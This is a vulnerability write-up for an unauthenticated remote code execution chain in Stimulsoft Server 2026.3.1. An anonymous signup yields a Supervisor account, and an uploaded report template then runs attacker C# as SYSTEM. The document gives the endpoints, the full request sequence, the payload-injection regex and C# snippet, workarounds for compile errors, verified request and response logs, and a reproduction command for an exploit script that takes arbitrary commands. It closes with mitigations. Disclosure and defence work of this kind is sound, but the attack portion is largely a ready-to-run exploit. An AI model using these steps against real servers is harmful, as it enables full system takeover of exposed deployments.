# Stimulsoft Server Unauthenticated Report Script RCE - Technical Analysis

## Overview

Stimulsoft Server 2026.3.1 is a .NET ASP.NET reporting platform. Its IIS-hosted web frontend (`Navigator.Web`) and independent backend Windows service (`StimulsoftServerAgent`) combine two default-configuration defects into a complete unauthenticated RCE primitive: (1) `/1/signup` is open by default with email activation disabled (`ActivationByEmail=false`), so an anonymous attacker registers and immediately receives a Supervisor account (`IsSupervisor`/`IsAdministrator`/`IsSystem` all true, `ItemReportTemplates:All`); (2) the report-script engine compiles embedded C# with `CSharpCodeProvider` in full trust — no AppDomain isolation, no CAS sandbox, no class allowlist — and instantiates the report class, executing the attacker-controlled constructor. The report task runs in the backend service process `Stimulsoft.Server.Agent.exe` as `NT AUTHORITY\SYSTEM`, so the constructor executes with the highest Windows privilege.

## Architecture

```
Frontend: IIS site Navigator.Web @ C:\inetpub\wwwroot\Navigator.Web, AppPool StimulsoftAppPool (NetworkService), .NET ASP.NET
Backend:  Windows service StimulsoftServerAgent (Automatic, LocalSystem)
          Stimulsoft.Server.Agent.exe (NT AUTHORITY\SYSTEM)   <- report task execution process (RCE identity)
          Stimulsoft.Server.Controller.exe (Administrator)
          Binaries @ C:\ProgramData\Stimulsoft-Server\Software-Releases\2026.3.1\
Config:   C:\ProgramData\Stimulsoft-Server\server.config (CoreUrl=http://localhost:40010)
Logs:     C:\ProgramData\Stimulsoft-Server\Logs\server.log
Default port: 40010 (production binds 0.0.0.0; research env rebound to 127.0.0.1)
Default DB:   SqlCe (no external DB required, works out of the box)
```

## Authentication Boundary

### Self-developed header authentication

- `GET /1/login` with headers `x-sti-UserName` / `x-sti-Password` -> JSON `ResultSessionKey` / `ResultUserKey` / `ResultWorkspaceKey` / `ResultRole`.
- Subsequent requests carry `x-sti-SessionKey` + `x-sti-UserKey`. The `runcommand` endpoint takes `SessionKey` from the JSON body, not from the header.

### Key default-configuration defect

`/1/signup` is open by default (`ShowSignUp=true`) and email activation is disabled (`ActivationByEmail=false`). Anonymous registration takes effect immediately, with no email verification gate.

### Authentication boundary verdict

- signup is open by default -> an anonymous attacker reaches Supervisor identity -> the authentication boundary **does not block RCE** (registration bypasses the auth gate).
- The report-script engine is open to Supervisor (`ItemReportTemplates:All`) -> the sink is reachable after authentication.
- **The full chain is unauthenticated**: signup is an unauthenticated endpoint, so the entire chain is an unauthenticated RCE.

## Stage 1: Sink Identification

The report-script engine compile-and-execute sink (ILSpy decompilation of `Stimulsoft.Server.dll` -> `StiReportWorker.cs` / `StiReportInAppDomain.cs`):

**`StiReportWorker.cs` CompileReport (line 25+)**:
- Compiles only when `report.CalculationMode == StiCalculationMode.Compilation`.
- `report.Compile(text)` (5 retries) -> `CSharpCodeProvider` compiles the embedded C# script into an assembly.
- The compiled artifact lands in the `Compiled-Reports` folder (filename contains Environment.Version + "2026.3.1.0" + ReportGuid/ItemKey + versionKey + ".dll").
- `return report.CompiledReport`.

**`StiReportInAppDomain.cs` (sandbox check)**:
- Full-text grep for `CreateDomain` / `PermissionSet` / `Evidence` / `PolicyLevel` / `IsFullyTrusted` / `CreateInstanceAndUnwrap` returns **0 hits** (only the class name contains "InAppDomain").
- -> The report script **executes in-process, with no AppDomain isolation and no CAS sandbox**. The compiled assembly is loaded in full trust.

**Execution path** (`StiReportInAppDomain.cs`):
```
RunInternal (1131) -> LoadReport (1168) -> CompileReport (1184) -> RenderReport (1200)
```
`RenderReport` -> `StiReportWorker.Run.RunReport` -> `GetReportFromAssembly` scans for `IsSubclassOf(StiReport)` types -> `StiActivator.CreateObject` instantiates -> **constructor executes**.

**Sink chain**: `CSharpCodeProvider.CompileAssemblyFromSource` (compile) -> `Assembly.Load` (load, full trust) -> `Activator.CreateInstance` (instantiate) -> StiReport subclass ctor (execute arbitrary C#).

## Stage 2: Source Identification

**Source = the `<Script>` element inside a `.mrt` report template** (C# source code).

- Upload endpoint: `POST /1/runcommand` (`Ident: ItemResourceSave`), JSON body `Resource` field = base64-encoded `.mrt`.
- `.mrt` format: `<StiSerializer version="1.02" type="Net" application="StiReport">`, containing `<ScriptLanguage>CSharp</ScriptLanguage>` + `<Script>...C# source...</Script>`.
- **Critical**: the `application="StiReport"` attribute is required — without it the Stimulsoft deserializer does not recognize the file as a report and `<Script>` is ignored (tested: a minimal `.mrt` missing this attribute compiles and runs but produces no marker).
- Trigger endpoint: `PUT /1/reporttemplates/<key>/run` (`Ident: ReportRun`).

**Source controllability**: Supervisor has `ItemReportTemplates:All` -> can create/upload/run report templates at will -> Script content is fully attacker-controlled.

## Stage 3: Data Flow

```
[anonymous attacker]
  |
  | 1. POST /1/signup  {"UserName","Password"}   (unauth, ActivationByEmail=false)
  v
[Supervisor account]  IsSupervisor/IsAdministrator/IsSystem=true, ItemReportTemplates:All
  |
  | 2. GET /1/login  (x-sti-UserName/Password)  -> ResultSessionKey
  v
[Supervisor session]
  |
  | 3. POST /1/reporttemplates  (create ReportTemplateItem, 32-hex Key)
  v
[report template item_key]
  |
  | 4. POST /1/runcommand  ItemResourceSave  (Resource=base64(.mrt with malicious C#))
  |    .mrt = Quote.mrt base + payload(File.WriteAllText in ctor) + CalculationMode=Compilation
  v
[.mrt resource bound to item_key]
  |
  | 5. PUT /1/reporttemplates/<item_key>/run  (SessionKey in body)
  v
[backend Stimulsoft.Server.Agent.exe (SYSTEM)]
  | CompileReport -> CSharpCodeProvider.CompileAssemblyFromScript (full trust, no sandbox)
  | -> Assembly.Load -> GetReportFromAssembly -> StiActivator.CreateObject(StiReport subclass)
  v
[ctor executes]  File.WriteAllText(marker, "RCE_STIMULSOFT " + WindowsIdentity.GetCurrent().Name)
  v
[arbitrary code execution as NT AUTHORITY\SYSTEM]
```

## Stage 4: Injection / Exploit Construction

### 4.1 .mrt construction (Quote.mrt base + surgical insert)

The real sample `Quote.mrt` (`Stimulsoft.Server.Resources.Quote.mrt`, 15093 bytes) contains a valid `application="StiReport"` and the Script structure:

```csharp
namespace Reports {
    public class Report : Stimulsoft.Report.StiReport {
        public Report() { this.InitializeComponent(); }
        #region StiReport Designer generated code - do not modify
        #endregion StiReport Designer generated code - do not modify
    }
}
```

**Payload injection**: insert after `this.InitializeComponent();` and before the ctor closing `}` (regex `(\s*this\.InitializeComponent\(\);\s*\n)(\s*\})`, DOTALL, count=1):

```csharp
try { System.IO.File.WriteAllText("<marker-path>",
    "RCE_STIMULSOFT " + System.Security.Principal.WindowsIdentity.GetCurrent().Name); } catch {}
```

**Force compilation mode** (insert after EngineVersion):
```xml
<CalculationMode>Compilation</CalculationMode>
```

### 4.2 Key technical points (lessons learned, hardened)

1. **`application="StiReport"` attribute is required**: a minimal `.mrt` using `<StiSerializer version="1.03" type="Net">` is missing this attribute -> the deserializer does not recognize it as a report -> Script is ignored -> an empty report compiles and runs with no marker. The real `Quote.mrt` must be used as the base.

2. **File paths must use forward slashes**: a C# string like `C:\path\to\...` contains `\t` / `\p` style sequences (invalid C# escapes). The Stimulsoft deserializer converts `\\` to `\`, so double backslashes become single backslashes -> an invalid escape -> CS1009 lexical error -> breaks the entire file parse -> CS1518 cascade. **Forward slashes `C:/path/to/...`** are accepted by .NET and have no escape problem.

3. **Payload inserted after InitializeComponent()**: ensures the ctor executes the payload when `GetReportFromAssembly` instantiates the StiReport subclass.

4. **Use `File.WriteAllText` + `WindowsIdentity.GetCurrent().Name`**: no `cmd.exe`, no `>` redirection, no backslashes — most robust, and the marker content directly proves the execution identity.

5. **`runcommand` SessionKey is in the JSON body**: this endpoint does not take SessionKey from the header; it must be passed as `SessionKey` + `WorkspaceKey` in the JSON body.

## Stage 5: Dynamic Verification

### 5.1 Execution environment

- Target: Windows Server 2025, Stimulsoft Server 2026.3.1 fully installed, default SqlCe, port 40010 bound to 127.0.0.1.
- Execution host: the same Windows server, Python 3.12.
- Credentials: `test@test.com` / `Test12345!` (obtained via unauthenticated `/1/signup`, Supervisor role).

### 5.2 Real HTTP requests + responses (script stdout, 2026-07-31 17:26:38 UTC+8)

**Step 1 — signup (unauthenticated)**:
```
POST /1/signup  {"UserName":"test@test.com","Password":"Test12345!"}
-> 200 {"Ident":"UserSignUp","ResultActivationByEmail":false,"ResultLoginPossible":true,"ResultSuccess":true}
```

**Step 2 — login -> Supervisor session**:
```
GET /1/login  headers: x-sti-UserName=test@test.com, x-sti-Password=Test12345!
-> 200  ResultSessionKey=5ea3218c...  ResultRole=Supervisor (IsSupervisor/IsAdministrator/IsSystem=true)
```

**Step 3 — create report template item**:
```
POST /1/reporttemplates  {"Ident":"ReportTemplateItem","Key":"7baec2a5...","Name":"rce_exploit"}
-> 200  ResultItems[0].Key=7baec2a5...
```

**Step 4 — upload malicious .mrt (runcommand ItemResourceSave)**:
```
POST /1/runcommand  {"Ident":"ItemResourceSave","SessionKey":...,"WorkspaceKey":...,
                     "ItemKey":"7baec2a5...","VersionKey":"ad6b74d2...","Type":"Insert",
                     "Resource":"<base64 .mrt 14951 bytes>"}
-> 200 {"ResultVersionKey":"ad6b74d2...","ResultSuccess":true}
```

**Step 5 — trigger run (compile + execute)**:
```
PUT /1/reporttemplates/7baec2a5.../run  {"SessionKey":...,"WorkspaceKey":...}
-> 200 {"Ident":"ReportRun","ResultTaskKey":"41b13dde...","ResultSuccess":true}
```

**Polling**: `GET /1/reporttemplates/<key>` -> `StateKey=2` (Done/Finished).

### 5.3 Result evidence

**Marker file (host read)**:
```
$ Get-Content <marker-path>
RCE_STIMULSOFT NT AUTHORITY\SYSTEM
$ (Get-Item ...).LastWriteTime
2026-07-31 17:26:38
```

**server.log** (`C:\ProgramData\Stimulsoft-Server\Logs\server.log`):
```
2026/7/31 9:26:38:Reports:Information:Reports.[rce_exploit].Compile
2026/7/31 9:26:38:Reports:Information:Reports.[rce_exploit].Data.Processing
2026/7/31 9:26:38:Reports:Information:Reports.[rce_exploit].Run..ok
```
`Compile` -> `Run..ok` with no compilation errors (contrast the earlier `\s` escape-error version that produced a CS1009/CS1518 cascade). The marker was written at 09:26:38 UTC, the same second as `Run..ok`.

### 5.4 Conclusion

- **RCE reproduced**: Yes
- **Execution identity**: `NT AUTHORITY\SYSTEM` (backend service process `Stimulsoft.Server.Agent.exe`, Windows service `StimulsoftServerAgent` LocalSystem)
- **Authentication required**: None (signup open by default, no email activation)
- **Adversarial verification gate**: passed (dual subagent — falsification agent + independent re-analysis agent — both confirmed the sink is reachable, the parameter is controllable, the filter is missing, and there is no hardening)

## Stage 6: Reachability

- **Network reachability**: port 40010 (default config `*:40010`; research env rebound to 127.0.0.1; production default 0.0.0.0 public exposure).
- **Authentication reachability**: signup is unauthenticated and open -> any remote attacker reaches Supervisor.
- **Permission reachability**: Supervisor -> `ItemReportTemplates:All` -> can create/upload/run report templates.
- **Sink reachability**: `AllowReportCompilation=true` (default) + `CalculationMode=Compilation` (forced inside the .mrt) -> CSharpCodeProvider compile-and-execute.
- **No sandbox blocking**: no AppDomain / no CAS / no class allowlist -> arbitrary BCL calls (File/Process/Reflection).

## Stage 7: Defense in Depth / Mitigation

1. **Disable default-open registration**: `ShowSignUp=false` (or add administrator approval / email activation gate, `ActivationByEmail=true` with strict verification).
2. **Downgrade the registered-user role**: new signups default to `Guest` not `Supervisor`; `Supervisor` only created manually by an administrator at install time.
3. **Sandbox the report-script engine**: restricted AppDomain + `PermissionSet` (execution only, no File/Process/Reflection) + class allowlist; or disable `AllowReportCompilation` (Interpretation mode only).
4. **Downgrade the backend service**: `StimulsoftServerAgent` should not run as LocalSystem; use a low-privileged service account.
5. **Audit script content before compilation**: scan for sinks (`Process.Start`/`File.IO`/`Reflection`/`Assembly.Load`), reject scripts containing dangerous calls.

## Reproduction

```powershell
# On the Windows server (Python 3.12)
python3 stimulsoft_server_unauth_report_script_rce.py http://127.0.0.1:40010 <report-template.mrt>
# Custom marker / command:
python3 stimulsoft_server_unauth_report_script_rce.py http://<target>:40010 <report-template.mrt> "<cmd>"
# Credentials overridable via env: STI_USER / STI_PASS / STI_MARKER
```
